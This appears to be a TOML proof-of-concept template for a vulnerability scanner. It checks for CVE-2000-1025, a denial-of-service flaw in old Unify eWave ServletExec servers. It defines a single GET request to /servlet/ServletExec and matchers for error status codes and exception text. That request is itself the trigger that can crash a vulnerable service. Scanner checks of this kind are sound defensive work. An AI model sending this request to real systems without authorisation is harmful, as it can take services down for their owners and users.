[info]
author = "AVE"
description = "检测目标 Unify eWave ServletExec 3.0C 及更早版本是否存在拒绝服务漏洞。通过发送包含 /servlet/ 路径的 HTTP GET 请求，若 ServletExec servlet 已在运行则会触发异常导致服务崩溃。参考 ExploitDB 20336 及 SecurityFocus BID 1868。"
id = "POC-AVE-2000-0749"
name = "Unify eWave ServletExec 拒绝服务漏洞 PoC"
severity = "medium"
tags = [
    "cve-2000-1025",
    "dos",
    "servletexec",
]
vuln_id = [
    "CVE-2000-1025",
    "AVE-2000-0749",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/servlet/ServletExec"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    503,
    502,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Exception",
    "ServletExec",
    "error",
]
